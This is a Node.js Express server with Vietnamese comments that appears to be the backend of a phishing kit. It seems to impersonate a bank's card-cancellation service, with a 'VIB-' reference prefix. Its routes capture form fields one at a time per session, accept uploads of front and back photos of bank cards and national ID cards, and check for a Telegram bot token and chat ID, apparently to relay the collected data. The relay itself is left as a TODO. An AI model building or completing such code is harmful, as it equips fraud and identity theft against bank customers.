// server.js — CommonJS (không cần "type":"module")
require('dotenv').config();
const path = require('path');
const express = require('express');
const cors = require('cors');
const multer = require('multer');

const app = express();
app.use(cors());
app.use(express.json());

// Log để chắc chắn bạn đang chạy ĐÚNG file
console.log('[INFO] cwd =', process.cwd());
console.log('[INFO] server file =', __filename);

// ====== ROUTES ======

// a) Ping tổng quát
app.get('/api/status', (req, res) => {
  res.json({
    status: 'ok',
    port: process.env.PORT ? Number(process.env.PORT) : undefined
  });
});

// b) Telegram status (bạn đã có sẵn endpoint này)
app.get('/api/telegram/status', (req, res) => {
  res.json({
    status: 'ok',
    tokenSet: !!process.env.TELEGRAM_BOT_TOKEN,
    chatIdSet: !!process.env.TELEGRAM_CHAT_ID,
    port: process.env.PORT ? Number(process.env.PORT) : undefined
  });
});

// c) Test Telegram (echo) — để FE/PowerShell có POST hợp lệ
app.post('/api/telegram/test', (req, res) => {
  // TODO: tích hợp gửi Telegram thật nếu muốn
  res.json({ status: 'ok', echo: req.body || null });
});

// d) Cập nhật 1 trường form
app.post('/api/field-update', (req, res) => {
  const { sessionId, field, value, page } = req.body || {};
  if (!sessionId || !field) {
    return res.status(400).json({ status: 'error', message: 'Missing sessionId/field' });
  }
  // TODO: lưu vào memory/redis/db nếu cần
  res.json({ status: 'ok' });
});

// e) Nhận form có file (đổi tên field theo form của bạn)
const upload = multer({ limits: { fileSize: 20 * 1024 * 1024 } });
const filesMw = upload.fields([
  { name: 'anhTheMatTruoc', maxCount: 1 },
  { name: 'anhTheMatSau',   maxCount: 1 },
  { name: 'anhCCCDTruoc',   maxCount: 1 },
  { name: 'anhCCCDSau',     maxCount: 1 },
]);
app.post('/api/huy-the/submit', filesMw, (req, res) => {
  res.json({ status: 'ok', ref: 'VIB-' + Date.now() });
});

// Dev helper: liệt kê route đang có để bạn tự kiểm tra
app.get('/__routes', (req, res) => {
  const routes = [];
  app._router.stack.forEach((m) => {
    if (m.route) {
      routes.push({ methods: Object.keys(m.route.methods).map(k=>k.toUpperCase()), path: m.route.path });
    } else if (m.name === 'router' && m.handle.stack) {
      m.handle.stack.forEach((h) => {
        if (h.route) routes.push({ methods: Object.keys(h.route.methods).map(k=>k.toUpperCase()), path: h.route.path });
      });
    }
  });
  res.json(routes);
});

// 404 JSON
app.use((req, res) => {
  res.status(404).json({ status: 'error', message: 'Not found' });
});

// ====== START ======
const PORT = process.env.PORT || 4010;
// Bind IPv4 để khớp 127.0.0.1
app.listen(PORT, '127.0.0.1', () => {
  console.log(`[START] Tele API on http://127.0.0.1:${PORT}`);
});
